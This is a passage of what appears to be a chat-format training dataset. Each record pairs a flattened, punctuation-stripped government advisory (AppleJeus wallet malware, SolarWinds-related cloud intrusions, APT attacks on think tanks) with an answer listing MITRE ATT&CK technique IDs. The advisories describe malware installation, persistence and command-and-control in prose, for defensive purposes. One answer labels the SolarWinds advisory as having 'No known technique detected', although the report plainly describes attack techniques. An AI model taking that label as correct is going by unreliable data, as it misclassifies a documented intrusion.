property list plist file comcoingotradepkgproductplist librarylaunchdaemons folder scheduled taskjob launchd launchdaemon run automatically plist file moved postinstall script launches coingotradeupgradedaemon runs background create modify system process launch daemon payload windows malwares payload could downloaded c2 server longer accessible additionally none opensource reporting sample contained copies payload windows payload likely similar functionality macos x stage 2 detailed stage 2 payload macos x malware longer available specified download url still file submitted virustotal user date macos x coingotradeupgradedaemon clues suggest submitted file may related macos x version malware downloaded payload file prtspool 64bit macho executable large variety features confirmed functionality file three c2 urls hardcoded file communicates http post multipartform data boundary string like hidden cobra malware prtspool uses format strings store data collected system sends c2s details applejeus version 5 coingotrade see mar103224635v1 applejeus version 6 dorusio introduction infrastructure march 2020 additional version applejeus malware identified time malware marketed distributed legitimatelooking company called dorusio website dorusiocom acquire infrastructure domain researchers collected samples windows macos x versions dorusio wallet develop capabilities malware least early 2020 actual download links result 404 errors download page release notes version revisions claiming start version 100 released april 15 2019 domain dorusiocom resolved ip address 1985411551 march 30 2020 january 23 2021 ip address controlled namecheap inc asn 22612 located atlanta ga ip address asn coingotradecom ants2whalecom domain dorusiocom valid sectigo ssl certificate obtain capabilities digital certificates ssl certificate domain control validated weak security verification level require validation owners identity actual businesss existence dorusio application analysis windows program windows version malicious application msi installer installer appears legitimate install following two programs installs dorusioexe folder cprogram files x86dorusio installs dorusioupgradeexe folder cusersusernameappdataroamingdorusiosupport runs dorusioupgradeexe program dorusioexe loads legitimatelooking cryptocurrency wallet platform signs malicious activity copy opensource cryptocurrency application program dorusioupgradeexe first installs service create modify system process windows service automatically start user logs boot logon autostart execution service installed description stating automatic dorusio upgrade launched collects victims host information system owneruser discovery combines information strings exfiltration sends c2 website exfiltration c2 channel macos x program macos version malicious application dmg installer installer looks legitimate similar functionality windows version digital certificate warn user installation installer executes following actions installs dorusio folder applicationsdorusioappcontentsmacos installs dorusioupgrade folder applicationsdorusioappcontentsmacos executes postinstall script creates dorusiodaemon folder libraryapplication support folder moves dorusioupgrade new folder moves comdorusiopkgwalletplist folder librarylaunchdaemons runs dorusioupgrade background dorusio program likely copy opensource cryptocurrency wallet application loads legitimatelooking wallet program fully functional aside dorusio logo two new services wallet appears kupay wallet application seems modification opensource cryptocurrency wallet copay distributed atlantabased company bitpay dorusioupgrade program calls function checkupdate contains logic functionality malware sends post c2 server connection named dorusio wallet 210 check update osx application layer protocol web protocols c2 server returns file decoded written victims folder privatetmpdorusioupdate permissions set command chmod 700 user read write execute command scripting interpreter stage 2 launched malware dorusioupgrade returns sleeping checking c2 server predetermined intervals application layer protocol web protocols postinstall script similar functionality applejeus scripts command scripting interpreter unix shell creates dorusiodaemon folder libraryapplication support folder moves dorusioupgrade new folder moves property list plist file comdorusiopkgwalletplist installer package librarylaunchdaemons folder scheduled taskjob launchd launchdaemon run automatically plist file moved postinstall script launches dorusioupgrade runs background create modify system process launch daemon payload neither payload windows macos x malware could downloaded c2 server longer accessible payloads likely similar functionality macos x stage 2 coingotrade kupay wallet windows stage 2 union crypto details applejeus version 6 dorusio see mar103224636v1 applejeus 4 5 6 installation conflictions user attempts install kupay wallet coingotrade dorusio applications system encounter installation conflicts kupay wallet already installed system user tries install coingotrade dorusio popup windows appear stating recent version program already installed coingotrade already installed system user attempts install kupay wallet kupayexe installed cprogram files x86coingotrade folder coingotrade files deleted folders files contained cusersusernameappdataroamingcoingotradesupport remain installed kupayupgradeexe installed new folder cusersusernameappdataroamingkupaysupport dorusio already installed system user attempts install kupay wallet kupayexe installed cprogram files x86dorusio folder dorusioexe files deleted folders files contained cusersusernameappdataroamingdorusiosupport remain installed kupayupgradeexe installed new folder cusersusernameappdataroamingkupaysupport applejeus version 7 ants2whale introduction infrastructure late 2020 new version applejeus identified called ants2whale site version applejeus ants2whalecom acquire infrastructure domain website shows legitimatelooking cryptocurrency company application website contains multiple spelling grammar mistakes indicating creator may english first language website states download ants2whale user must contact administrator product premium package develop capabilities malware domain ants2whalecom resolved ip address 19854114237 september 23 2020 january 22 2021 ip address controlled namecheap inc asn 22612 located atlanta ga ip address asn coingotradecom dorusiocom domain ants2whalecom valid sectigo ssl certificate obtain capabilities digital certificates ssl certificate domain control validated weak security verification level require validation owners identity actual businesss existence ants2whale application analysis windows program late 2020 windows program available virustotal likely similar macos x version detailed macos x program macos version malicious application dmg installer installer looks legitimate similar functionality windows version digital certificate warn user installation installer executes following actions installs ants2whale folder applicationsants2whaleappcontentsmacosants2whale installs ants2whalehelper folder libraryapplication supportants2whalesupport executes postinstall script moves comants2whalepkgwalletplist folder librarylaunchdaemons runs ants2whalehelper background ants2whale ants2whalehelper programs postinstall script function almost identically previous versions applejeus discussed depth advisory details applejeus version 7 ants2whale see mar103224637v1 attck profile figure 2 table 2 provide summaries mitre attck techniques observed figure 2 mitre attck enterprise techniques used applejeus table 2 mitre attck techniques observed mitigations compromise mitigations organizations identify applejeus malware within networks take immediate action initial actions include following steps contact fbi cisa treasury immediately regarding identified activity related applejeus refer contact information section initiate organizations incident response plan generate new keys wallets andor move new wallets introduce twofactor authentication solution extra layer verification use hardware wallets keep private keys separate secured storage area move funds compromised wallet use malware listed advisory transfer funds form transactions offline broadcast network short online session ideally prior attacker accessing remove impacted hosts network assume threat actors moved laterally within network downloaded additional malware change passwords accounts associated impacted hosts reimage impacted hosts install antivirus software run daily deep scans host ensure antivirus software setup download latest signatures daily install host based intrusion detection hidsbased software keep date ensure software hardware date patches installed ensure networkbased firewall installed andor date ensure firewalls firmware date proactive mitigations consider following recommendations defense applejeus malware related activity cryptocurrency users verify source cryptocurrencyrelated applications use multiple wallets key storage striking appropriate risk balance hot cold storage use custodial accounts multifactor authentication mechanisms user device verification patronize cryptocurrency service businesses offer indemnity protections lost stolen cryptocurrency consider dedicated device cryptocurrency management financial service companies verify compliance federal financial institutions examination council ffiec handbooks httpsithandbookffiecgov especially related information security report suspicious cyber financial activities information mandatory voluntary reporting cyber events via suspicious activity reports see financial crimes enforcement network fincen advisory fin2016a005 advisory financial institutions cyber events cyberenabled crime httpswwwfincengovsitesdefaultfilesadvisory20161025cyber20threats20advisory2020final205082pdf fincens section 314b fact sheet httpswwwfincengovsitesdefaultfilesshared314bfactsheetpdf cryptocurrency businesses verify compliance cryptocurrency security standard httpcryptoconsortiumgithubioccss organizations incorporate iocs identified cisas malware analysis reports httpsuscertcisagovnorthkorea intrusion detection systems security alert systems enable active blocking reporting suspected malicious activity see table 3 provides summary preventative attck mitigations based observed techniques table 3 mitre attck mitigations based observed techniques contact information recipients report encouraged contribute additional information may related threat questions related report report intrusion request resources incident response technical assistance please contact fbi fbi cyber division 8552923937 cywatchfbigov local field office cisa 8882820870 centralcisadhsgov treasury office cybersecurity critical infrastructure protection treasury occip 2026223000 occipcoordtreasurygov references1 cisa alert aa20239a fastcash 20 north koreas beagleboyz robbing banks2 department treasury press release treasury sanctions individuals laundering cryptocurrency lazarus group3 department justice press release two chinese nationals charged laundering 100 million cryptocurrency exchange hack4 cisa alert ta17318a hidden cobra north korean remote administration tool fallchill5 cisa alert ta17318a hidden cobra north korean remote administration tool fallchill6 mitre attck software fallchill7 securelist operation applejeus sequel8 github blackbird bitcoin arbitrage revisions february 17 2021 initial versionapril 15 2021 updated mitre attck technique command scripting interpreter applescript command scripting interpreter unix shell product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1027, T1033, T1041, T1053.005, T1059, T1059.004, T1071.001, T1204.002, T1543.003, T1547, T1548, T1564.001, T1566.002, T1573, T1573.001, T1583.001, T1587.001, T1588"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary advisory uses mitre adversarial tactics techniques common knowledge attck framework see attck enterprise referenced threat actor tactics techniques updated april 15 2021 us government attributes activity russian foreign intelligence service svr additional information may found statement white house information solarwindsrelated activity go httpsuscertcisagovremediatingaptcompromisednetworks httpswwwcisagovsupplychaincompromise alert companion alert aa20352a advanced persistent threat compromise government agencies critical infrastructure private sector organizations aa20352a primarily focuses advanced persistent threat apt actors compromise solarwinds orion products initial access vector networks us government agencies critical infrastructure entities private network organizations noted aa20352a cybersecurity infrastructure security agency cisa evidence initial access vectors addition compromised solarwinds orion products alert also addresses activityirrespective initial access vector leveragedthat cisa attributes apt actor specifically cisa seen apt actor using compromised applications victims microsoft 365 m365azure environment cisa also seen apt actor utilizing additional credentials application programming interface api access cloud resources private public sector organizations tactics techniques procedures ttps feature three key components compromising bypassing federated identity solutions using forged authentication tokens move laterally microsoft cloud environments using privileged access victims cloud environment establish difficulttodetect persistence mechanisms application programming interface apibased access alert describes ttps offers overview guidance available opensource toolsincluding cisadeveloped tool sparrowfor network defenders analyze microsoft azure active directory ad office 365 o365 m365 environments detect potentially malicious activity note alert describes artifactspresented attacksfrom cisa identified detectable evidence threat actors initial objectives cisa continues analyze threat actors followon objectives technical details frequently cisa observed apt actor gaining initial access victims enterprise networks via compromised solarwinds orion products eg solorigate sunburst1 however cisa investigating instances threat actor may obtained initial access password guessing password spraying andor exploiting inappropriately secured administrative service credentials unsecured credentials instead utilizing compromised solarwinds orion products cisa observed threat actor moving user context administrator rights privilege escalation within compromised network using native windows tools techniques windows management instrumentation wmi enumerate microsoft active directory federated services adfs certificatesigning capability enumeration allows threat actors forge authentication tokens oauth issue claims service providerswithout claims checked identity providerand move laterally microsoft cloud environments lateral movement threat actor also used onpremises access manipulate bypass identity controls multifactor authentication activity demonstrates sophisticated adversaries use credentials one portion organization move laterally lateral movement trust boundaries evade defenses detection defense evasion steal sensitive data collection level compromise challenging remediate requires rigorous multidisciplinary effort regain administrative control recovering mitigations detection guidance identifying affected solarwinds software well documented2 howeveronce organization identifies compromise via solarwinds orion products threat actor ttpsidentifying followon activity onpremises networks requires finetuned network hostbased forensics nature cloud forensics unique due growing rapidly evolving technology footprints major vendors microsofts o365 m365 environments builtin capabilities detecting unusual activity microsoft also provides premium services advanced threat protectionatp azure sentinel enable network defenders investigate ttps specific solorigate activity3 detection tools cisa providing examples detection tools informational purposes cisa endorse commercial product service including subjects analysis reference specific commercial products processes services constitute imply endorsement recommendation favoring cisa number opensource tools available investigate adversary activity microsoft cloud environments detect unusual activity service principals application activity4 publicly available powershell tools network defenders use investigate m365 microsoft azure include cisas sparrow opensource utility hawk crowdstrikes azure reporting tool crt additionally microsofts office 365 management api graph api provide open interface ingesting telemetry evaluating service configurations signs anomalous activity intrusion note opensource tools highlighted explained assist onsite investigation remediation cloud environments allencompassing open source tools complemented services azure sentinel microsoft premium service provides comprehensive analysis tools including custom detections activity indicated general guidance using detection tools audit creation use service principal credentials look unusual application usage use dormant applications audit assignment credentials applications allow noninteractive signin application look unexpected trust relationships added azure active directory download interactive signins azure admin portal use microsoft sentinel product review new token validation time periods high values investigate whether legitimate change attempt gain persistence threat actor sparrow cisa created sparrow help network defenders detect possible compromised accounts applications azurem365 environment tool focuses narrow scope user application activity endemic identity authenticationbased attacks seen recently multiple sectors neither comprehensive exhaustive available data intended narrow larger set available investigation modules telemetry specific recent attacks federated identity sources applications updated april 8 2021 cisa hasalso created aviary companion splunk dashboard assist visualizing reviewing output sparrow network defenders find aviary cisas sparrow github pagecisa advises network defenders perform following actions use sparrow use sparrow detect recent domain authentication federation modifications domain federation modification operations uncommon investigated examine logs new modified credentials applied applications service principals delineate credential type sparrow used detect modification service principals application credentials create timeline credential changes focusing recent wholesale changes review top actors activity environment number credential modifications performed monitor changes application service principal credentials investigate instances excessive permissions granted including limited exchange online microsoft graph azure ad graph use sparrow detect privilege escalation adding service principal user group privileged role use sparrow detect oauth consent users consent applications useful interpreting changes adversary ttps use sparrow identify anomalous security assertion markup language saml token signins pivoting unified audit log userauthenticationvalue 16457 indicator saml token built potential indicator forged saml tokens note ttp subject significant published security research may indicate unusual usage token guest access external partners m365 resources review powershell logs sparrow exports review powershell mailbox signins validate logins legitimate actions review powershell usage users powershell environment use sparrow check graph api application permissions service principals applications m365azure ad investigate unusual activity regarding microsoft graph api permissions using either legacy httpsgraphwindowsnet httpsgraphmicrosoftcom graph used frequently part ttps often access manipulate mailbox resources review sparrows listed tenants azure ad domains see domains modified customers g5 e5 licensing levels review mailitemsaccessed insight application identification id used accessing users mailboxes use sparrow query specific application id using app id investigation capability check see accessing mail file items mailitemsaccessed event provides audibility mailbox data accessed via mail protocols clients analyzing mailitemsaccessed action incident responders determine user mailbox items accessed potentially exfiltrated threat actor event recorded even situations message necessarily read interactively eg bind sync5 resulting suspicious application id provide incident responders pivot detect suspicious applications require additional analysis check changes applications regards accessing resources mail file items updated april 8 2021 aviary used assist performing tasks install aviary running sparrow ingest comma separated values csv output sparrow powershell script splunk sparrow output following default filenames modified appupdateoperationsexportcsv approleassignmentoperationsexportcsv consentoperationsexportcsv domainlistcsv domainoperationsexportcsv fileitemsoperationsexportcsv mailitemsoperationsexportcsv psloginoperationsexportcsv psmailboxoperationsexportcsv samltokenoperationsexportcsv serviceprincipaloperationsexportcsv copy paste contents xml file aviaryxml root directory new dashboard use data selection filters point indexed sparrow data see figure 1 figure 1 data selection filters hawk hawk opensource powershelldriven communitydeveloped tool network defenders use quickly easily gather data o365 azure security investigations incident responders network defenders investigate specific user principals entire tenant data provides include ip addresses signin data additionally hawk track ip usage concurrent login situations hawk users review login details administrator accounts take following steps crowdstrike azure reporting tool crowdstrikes azure reporting tool crt help network defenders analyze microsoft azure ad m365 environment help organizations analyze permissions azure ad tenant service configuration tool minor overlap sparrow shows unique items cover areas cisa highlighting tool one free opensource tools available investigate activity could used complement sparrow detection tool distinctions detection methods microsoft breaks threat actors recent activity four primary stages described along associated detection methods microsoft describes stages beginning activity compromise onpremises identity solution adfs6 note step provides entry vector cloud technology environments unnecessary threat actor compromised identity solution credential allows apt direct access cloudeg without leveraging solarwinds orion vulnerability stage 1 forging trusted authentication token used access resources trust onpremises identity provider attacks often referred golden security assertion markup language attacks analyzed using combination cloudbased standard onpremises techniques7 example network defenders use oauth claims specific principals made azure ad level compare onpremises identity export signin logs azure ad portal look authentication method field note portalazurecom click user review authentication details eg date method result without sentinel way get logs critical effort detection method 1 correlating service provider login events corresponding authentication events active directory federation services adfs domain controllers using saml single signon search logins service providers corresponding event ids 4769 1200 1202 domain detection method 2 identifying certificate export events adfs look detection method 3 customizing saml response identify irregular access method serves prevention future would detect future past activity helps identify irregularities point change forward organizations modify saml responses include custom elements service provider monitor detect anomalous requests8 detection method 4 detecting malicious adfs trust modification threat actor gains administrative access adfs add new trusted adfs rather extracting certificate private key part standard golden saml attack9 network defenders look stage 2 using forged authentication token create configuration changes service provider azure ad establishing foothold threat actor compromised onpremises identity provider identify next series objectives reviewing activity microsoft cloud activity space microsoft azure m365 tenants threat actor uses ability forge authentication tokens establish presence cloud environment actor adds additional credentials existing service principal threat actor impersonated privileged azure ad account likely manipulate azurem365 environment action objectives cloud network defenders take following steps stage 3 acquiring oauth access token application using forged credentials added existing application service principal calling apis permissions assigned application cases threat actor observed adding permissions existing applications service principals additionally actor seen establishing new applications service principals briefly using add permissions existing applications service principals possibly add layer indirection eg using add credential another service principal deleting it11 network defenders use sparrow stage 4 access established threat actor uses microsoft graph api conduct action objectives external restful api queries impersonating existing applications network defenders microsoft telemetry nuances existing tools techniques used evaluate cloudbased telemetry sources present challenges represented traditional forensic techniques primarily amount telemetry retention far less traditional logging facilities onpremises data sources threat actor activity 90 days old unlikely saved traditional sources visible microsoft m365 management api ual service principal logging available using azure portal via service principal signins feature enable settings azure portal see diagnostic setting ingest logs sentinel thirdparty security information event management siem tool azure premium p1 premium p2 license necessary access setting well features log analytics workspace storage account event hub12 logs must downloaded manually ingested one methods listed detection methods section global administrator rights often required tools hawk sparrow evaluate m365 cloud security posture logging capability visibility data varies licensing models subscription premium services microsoft defender o365 azure sentinel according crowdstrike inability audit via api requirement global admin rights view important information found excessive key information easily accessible13 documentation specific event codes userauthenticationmethod 16457 may indicate suspicious saml token forgery longer available m365 unified access log auditing narratives events longer exist part core microsoft documentation sources use industrystandard siems log detection crucial providing historical context threat hunting microsoft cloud environments standard g3e3 licenses provide 90 days auditing advanced auditing license provided g5e5 license audit logs extended retain information year cisa notes license change proactive rather reactive allows enhanced visibility features telemetry moment integration provide retroactive visibility previous events historical context properly configured siem provide builtin tools microsoft cloud services m365 applications provide much visibility available custom tools mapped mitre attck framework easytounderstand dashboards14 however tools often ability pull historical data older seven days therefore storage solutions appropriately meet governance standards usability metrics analysts siem must carefully planned arranged ingest comma separated values csv output sparrow powershell script splunk sparrow output following default filenames modified appupdateoperationsexportcsvapproleassignmentoperationsexportcsv consentoperationsexportcsv domainlistcsv domainoperationsexportcsv fileitemsoperationsexportcsv mailitemsoperationsexportcsv psloginoperationsexportcsv psmailboxoperationsexportcsv samltokenoperationsexportcsv serviceprincipaloperationsexportcsv copy paste contents xml file aviaryxml root directory new dashboard use data selection filters point indexed sparrow data see figure 1 investigate highvalue administrative accounts detect anomalous unusual activity global admins enable powershell logging evaluate powershell activity environment used traditional expected purposes powershell logging reveal exact cmdlet run tenant look users unusual signin locations dates times check permissions service principals applications m365azure ad detect frequency resource access unusual places use tool pivot trusted application see accessing mail file items review mailbox rules recent mailbox rule changes sparrow differs crt looking specific indicators compromise associated recent attacks crt focuses tenants azure ad permissions exchange online configuration settings instead unified audit log gives different output sparrow hawk crt returns broad scope applicationdelegated permissions service principals applications hawk part investigation sparrow homes narrow set application permissions given graph api common recent attacks crt looks exchange online federation configuration federation trust sparrow focuses listing azure ad domains among items network defenders use crt review delegated permissions application permissions federation configurations federation trusts mail forwarding rules service principals objects keycredentials ip address activityid eventcode 410 activityid instanceid eventcode 500 exportpfxcertificate certutilexportpfx event ids 4103 4104 may include detection certificate extraction technique deleted certificate extraction adfsdump performed using sysmon event id 18 pipe name microsoftwidtsqlquery exclude processes regularly making pipe connection machine event id 307 federation service configuration changed correlated relevant event id 510 instance id change details event id 510 instance id could one event per single event id 307 event event id 307 federation service configuration changed correlated relevant event id 510 instance id change details event id 510 instance id could one event per single event id 307 event review events particularly searching configuration type issuanceauthority property value references unfamiliar domain possible activity interrogating adfs host using adfs powershell plugins look changes federation trust environment would indicate new adfs sources audit creation use service principal application credentials sparrow detect modifications credentials look unusual application usage dormant forgotten applications used audit assignment credentials applications allow noninteractive signin application look unexpected trust relationships added azure ad download last 30 days noninteractive signins azure portal use azure sentinel10 use hawk submodules available run investigation specific user hawk provide ip addresses signin data data hawk also track ip usage concurrent login situations review login details administrator accounts eg highvalue administrative accounts global admins look unusual signin locations dates times review new token validation time periods high values investigate whether changes legitimate threat actors attempts gain persistence examine highly privileged accounts specifically using signin logs look unusual signin locations dates times create timeline credential changes monitor changes application credentials script export csv named appupdateoperationsexport detect service principal credentials change service principal change eg actor adds new permissions expands existing permissions export view activity via serviceprincipaloperationsexport record oauth consent consent applications export view record via consentoperationsexport file investigate instances excessive high permissions including limited exchange online microsoft graph azure ad graph review microsoft graph api permissions granted service principals export view activity via applicationgraphpermissions csv file note hawk also return full list service principal permissions investigation review top actors amount credential modifications performed monitor changes application credentials identify manipulation custom thirdparty applications network defenders review catalog custom thirdparty vendors applications microsoft tenant perform interrogation principles applications trusts review modifications federation trust settings review new token validation time periods high values investigate whether legitimate change attempt gain persistence threat actor script detects escalation privileges including addition service principals sp privileged roles export data csv called approleassignmentoperationsexport mailitemsaccessed operations found within unified audit log ual review application id used requires g5 e5 license specific detail query specific application id using sparrow scripts app id investigation capability interrogate mail file items accessed applicationid use application id utility suspicious apps require additional analysis check permissions application m365azure ad using sparrow hawk return azureapplicationaudit sparrow return applicationgraphpermissions network defenders see ip address graph api uses note microsoft ip address may show virtual private serveranonymized endpoint investigate specific service principal userspecific user account hawk activity challenging see without azure sentinel manually downloading reviewing logs signin portal longer term storage log data cross correlation log data endpoint data network data produced adfs servers endpoint detection response data identity provider information ability query use application connectors azure contact information cisa encourages recipients report contribute additional information may related threat questions related report please contact cisa 18882820870 outside united states 17032358832 centralcisadhsgov unclass uscertdhssgovgov siprnet uscertdhsicgov jwics cisa encourages report suspicious activity including cybersecurity incidents possible malicious code software vulnerabilities phishingrelated scams reporting forms found cisauscert homepage httpwwwuscertcisagov resources azure active directory workbook assess solorigate risk httpstechcommunitymicrosoftcomt5azureactivedirectoryidentityazureadworkbooktohelpyouassesssolorigateriskbap2010718 volexity dark halo leverages solarwinds compromise breach organizations httpswwwvolexitycomblog20201214darkhaloleveragessolarwindscompromisetobreachorganizations find activity sentinel httpswwwverbooninfo202010monitoringserviceprincipalsigninswithazureadandazuresentinel thirdparty walkthrough attack httpsdirkjanmioazureadprivilegeescalationapplicationadmin national security agency advisory detecting abuse authentication mechanisms httpsmediadefensegov2020dec172002554125110authenticationmechanismscsauoo19885420pdf microsoft 365 app splunk httpssplunkbasesplunkcomapp3786 cisa remediation guidance httpsuscertcisagovncasalertsaa20352a references1 zdnet second hacking group targeted solarwinds systems2 cisa supply chain compromise3 microsoft solarwinds postcompromise hunting azure sentinel4 microsoft solorigate resource center5 advanced audit microsoft 3656 microsoft understanding solorigates identity iocs7 detection hunting golden saml attack8 ibid9 ibid10 microsoft aadserviceprincipalsigninlogs11 microsoft understanding solorigates identity iocs12 azure active directory signin activity reports13 crowdstrike crowdstrike launches free tool identify help mitigate risks azure active directory14 microsoft 365 app splunk revisions initial version january 8 2021february 4 2021 removed link section outdated product feedback formapril 8 2021 added aviary dashboard informationapril 15 2021 added attribution statement product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary advisory uses mitre adversarial tactics techniques common knowledge attck framework see attck enterprise referenced threat actor tactics techniques cybersecurity infrastructure security agency cisa federal bureau investigation fbi observed persistent continued cyber intrusions advanced persistent threat apt actors targeting us think tanks malicious activity often exclusively directed individuals organizations focus international affairs national security policy1 following guidance may assist us think tanks developing network defense procedures prevent rapidly detect attacks apt actors relied multiple avenues initial access included loweffort capabilities spearphishing emails thirdparty message services directed corporate personal accounts well exploiting vulnerable webfacing devices remote connection capabilities increased telework covid19 pandemic expanded workforce reliance remote connectivity affording malicious actors opportunities exploit connections blend increased traffic attackers may leverage virtual private networks vpns remote work tools gain initial access persistence victims network successful loweffort highreward approaches allow threat actors steal sensitive information acquire user credentials gain persistent access victim networks given importance think tanks shaping us policy cisa fbi urge individuals organizations international affairs national security sectors immediately adopt heightened state awareness implement critical steps listed mitigations section advisory click pdf version report technical details attck profile cisa created following mitre attck profile provide nonexhaustive list tactics techniques procedures ttps employed apt actors break think tanks defenses conduct reconnaissance environments exfiltrate proprietary confidential information execute effects targets ttps included based upon closed reporting apt actors known target think tanks based upon cisa incident response data initial access valid accounts valid accounts cloud accounts external remote services driveby compromise exploit publicfacing application supply chain compromise compromise software supply chain trusted relationship phishing spearphishing attachment phishing spearphishing link phishing spearphishing via service execution windows management instrumentation scheduled taskjob scheduled task command scripting interpreter powershell command scripting interpreter windows command shell command scripting interpreter unix shell command scripting interpreter visual basic command scripting interpreter python native api exploitation client execution user execution malicious link user execution malicious file interprocess communication dynamic data exchange system services service execution persistence boot logon initialization scripts logon script windows scheduled taskjob scheduled task account manipulation exchange email delegate permissions create account local account office application startup office test office application startup outlook home page browser extensions bits jobs server software component web shell preos boot bootkit create modify system process windows service event triggered execution change default file association event triggered execution windows management instrumentation event subscription event triggered execution accessibility features event triggered execution component object model hijacking boot logon autostart execution registry run keys startup folder boot logon autostart execution shortcut modification privilege escalation process injection process injection process hollowing exploitation privilege escalation access token manipulation token impersonationtheft event triggered execution accessibility features boot logon autostart execution shortcut modification abuse elevation control mechanism bypass user access control hijack execution flow dll sideloading defense evasion rootkit obfuscated files information binary padding obfuscated files information software packing obfuscated files information steganography obfuscated files information indicator removal tools masquerading match legitimate name location indicator removal host clear windows event logs indicator removal host clear command history1070003 indicator removal host file deletion indicator removal host timestomp modify registry deobfuscatedecode files information exploitation defense evasion signed binary proxy execution compiled html file signed binary proxy execution mshta signed binary proxy execution rundll32 template injection execution guardrails environmental keying abuse elevation control mechanism bypass user access control use alternate authentication material application access token subvert trust controls code signing impair defenses disable modify tools impair defenses disable modify system firewall hide artifacts hidden files directories hide artifacts hidden window credential access os credential dumping lsass memory os credential dumping security account manager os credential dumping ntds os credential dumping lsa secrets os credential dumping cached domain credentials network sniffing input capture keylogging brute force password crackingbrute force password spraying forced authentication steal application access token unsecured credentials credentials files unsecured credentials group policy preferences credentials password stores credentials web browsers discovery system service discovery query registry system network configuration discovery remote system discovery system owneruser discovery network sniffing network service scanning system network connections discovery process discovery permission groups discovery local groups permission groups discovery domain groups system information discovery file directory discovery account discovery local account account discovery domain account peripheral device discovery network share discovery password policy discovery software discovery security software discovery lateral movement remote services remote desktop protocol remote services ssh taint shared content replication removable media exploitation remote services use alternate authentication material pass hash use alternate authentication material pass ticket collection data local system data removable media data staged local data staging screen capture email collection local email collection email collection remote email collection automated collection audio capture data information repositories sharepoint archive collected data archive via utility archive collected data archive via custom method command control data obfuscation junk data fallback channels application layer protocol web protocols application layer protocol file transfer protocols application layer protocol mail protocols application layer protocol dns proxy external proxy proxy multihop proxy proxy domain fronting communication removable media nonapplication layer protocol web service dead drop resolver web service bidirectional communication multistage channels ingress tool transfer data encoding standard encoding remote access software dynamic resolution domain generation algorithms nonstandard port protocol tunneling encrypted channel symmetric cryptography encrypted channel asymmetric cryptography exfiltration exfiltration c2 channel exfiltration alternative protocol exfiltration unencryptedobfuscated nonc2 protocol impact data encrypted impact resource hijacking system shutdownreboot disk wipe disk structure wipe mitigations cisa fbi recommend think tank organizations apply following critical practices strengthen security posture leaders implement training program familiarize users identifying social engineering techniques phishing emails usersstaff log remote connections use vigilant tailored spearphishing attacks targeting corporate personal accounts including email social media accounts use different passwords corporate personal accounts install antivirus software personal devices automatically scan quarantine suspicious files employ strong multifactor authentication personal accounts available exercise caution opening email attachments even attachment expected sender appears known see using caution email attachments using removable media eg usb thumb drives external drives cds staffcybersecurity personnel segment segregate networks functions change default username password applications appliances employ strong multifactor authentication corporate accounts deploy antivirus software organizational devices automatically scan quarantine suspicious files apply encryption data rest data transit use email security appliances scan remove malicious email attachments links monitor key internal security tools identify anomalous behavior flag known indicators compromise threat actor behaviors immediate response organizations implement mitigations varying complexity restrictiveness reduce risk posed threat actors use tor onion router carry malicious activities see cisafbi joint cybersecurity advisory defending malicious cyber activity originating tor mitigation options additional information prevent exploitation known software vulnerabilities routinely applying software patches upgrades foreign cyber threat actors continue exploit publicly knownand often datedsoftware vulnerabilities broad target sets including public private sector organizations vulnerabilities left unpatched exploitation often requires resources provides threat actors easy access victim networks review cisa fbis top 10 routinely exploited vulnerabilities cisa alerts identify vulnerabilities exploited foreign attackers implement antivirus program formalized patch management process block certain websites email attachments commonly associated malware egscrpifcpldllexe block email attachments scanned antivirus software egzip files implement group policy object firewall rules implement filters email gateway block suspicious ip addresses firewall routinely audit domain local accounts well permission levels look situations could allow adversary gain wide access obtaining credentials privileged account follow best practices design administration network limit privileged account use across administrative tiers implement domainbased message authentication reporting conformance dmarc validation system disable block unnecessary remote services limit access remote services centrally managed concentrators deny direct remote access internal systems resources using network proxies gateways firewalls limit unnecessary lateral communications disable file printer sharing services services required use strong passwords active directory authentication ensure applications store sensitive data credentials insecurely enable firewall agency workstations configured deny unsolicited connection requests disable unnecessary services agency workstations servers scan remove suspicious email attachments ensure scanned attachment true file type ie extension matches file header monitor users web browsing habits restrict access suspicious risky sites contact law enforcement cisa immediately regarding unauthorized network access identified visit mitre attck techniques tactics pages linked attck profile section additional mitigation detection strategies malicious activity targeting think tanks contact information recipients report encouraged contribute additional information may related threat report suspicious criminal activity related information found joint cybersecurity advisory contact local fbi field office wwwfbigovcontactusfield fbis 247 cyber watch cywatch 855 2923937 email cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact request incident response resources technical assistance related threats contact cisa centralcisagov references cisa alert microsoft office 365 security recommendations cisa alert technical approaches uncovering remediating malicious activity cisa webpage telework guidance cisa webpage vpnrelated guidance fbi private industry notification pin 20200409001 references1 cyberscoop europe prepares vote microsoft warns fancy bear attacks democratic think tanks revisions initial version december 1 2020 product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.001, T1003.002, T1003.003, T1003.005, T1005, T1007, T1012, T1016, T1018, T1021.001, T1025, T1027.001, T1027.002, T1027.003, T1033, T1036.005, T1040, T1041, T1046, T1047, T1049, T1053.005, T1055, T1055.012, T1056.001, T1057, T1059.001, T1059.003, T1059.004, T1059.005, T1059.006, T1068, T1069.002, T1070.001, T1070.004, T1071.001, T1071.002, T1074.001, T1078, T1078.004, T1080, T1082, T1083, T1087.001, T1087.002, T1090.002, T1090.003, T1091, T1095, T1105, T1106, T1110.002, T1110.003, T1112, T1113, T1114.002, T1119, T1120, T1123, T1132.001, T1133, T1135, T1136.001, T1140, T1187, T1189, T1190, T1199, T1203, T1204.001, T1204.002, T1210, T1213.002, T1218.005, T1218.011, T1219, T1480.001, T1486, T1496, T1505.003, T1518.001, T1528, T1529, T1543.003, T1547.001, T1547.009, T1548.002, T1550.002, T1552.001, T1553.002, T1555.003, T1560.001, T1562.001, T1562.004, T1564.001, T1566.001, T1566.002, T1569.002, T1571, T1572, T1573.001, T1573.002, T1574.002"}]}
